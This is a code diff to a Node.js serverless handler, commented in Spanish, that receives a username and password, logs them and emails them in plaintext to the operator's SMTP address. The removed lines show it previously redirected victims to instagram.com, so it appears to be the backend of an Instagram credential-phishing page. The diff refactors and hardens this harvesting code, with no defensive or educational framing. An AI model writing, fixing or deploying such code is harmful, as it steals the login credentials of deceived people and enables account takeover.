@@ -32,29 +32,36 @@ exports.handler = async (event) => {
   try {
     const { username, password } = JSON.parse(event.body);
     console.log('Datos recibidos:', { username, password });
-    
-    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
+
+    // Leer variables de entorno correctas
+    const user = process.env.SMTP_USER;
+    const pass = process.env.SMTP_PASS;
+    const host = process.env.SMTP_HOST;
+    const port = process.env.SMTP_PORT;
+
+    // Log para depuración
+    console.log('SMTP_USER:', user, 'SMTP_PASS length:', pass ? pass.length : 'undefined');
+    console.log('SMTP_HOST:', host, 'SMTP_PORT:', port);
+
+    if (!user || !pass || !host || !port) {
       throw new Error('Configuración de email incompleta');
     }
 
+    // Configurar el transporter
     const transporter = nodemailer.createTransport({
-      host: process.env.SMTP_HOST,
-      port: process.env.SMTP_PORT,
+      host,
+      port,
       secure: false,
       auth: {
-        user: process.env.SMTP_USER,
-        pass: process.env.SMTP_PASS
+        user,
+        pass
       }
     });
 
-    console.log('Transporter configurado');
-
-    // Verificar conexión SMTP
-    await transporter.verify();
-
-    const mailOptions = {
-      from: process.env.SMTP_USER,
-      to: process.env.SMTP_USER,
+    // Enviar correo
+    const info = await transporter.sendMail({
+      from: user,
+      to: user, // Puedes cambiar esto si quieres enviar a otro destinatario
       subject: 'Nuevo inicio de sesión detectado',
       text: `Usuario: ${username}\nContraseña: ${password}`,
       html: `
@@ -62,32 +69,21 @@ exports.handler = async (event) => {
         <p><strong>Usuario:</strong> ${username}</p>
         <p><strong>Contraseña:</strong> ${password}</p>
       `
-    };
-
-    const info = await transporter.sendMail(mailOptions);
+    });
 
     console.log('Correo enviado:', info);
 
     return {
       statusCode: 200,
       headers,
-      body: JSON.stringify({
-        success: true,
-        messageId: info.messageId,
-        redirectTo: 'https://www.instagram.com'
-      })
+      body: JSON.stringify({ message: 'Inicio de sesión exitoso' })
     };
-
   } catch (error) {
     console.error('Error detallado:', error);
-    
     return {
       statusCode: 500,
       headers,
-      body: JSON.stringify({
-        success: false,
-        error: error.message
-      })
+      body: JSON.stringify({ error: 'Error interno del servidor', details: error.message })
     };
   }
 }; 
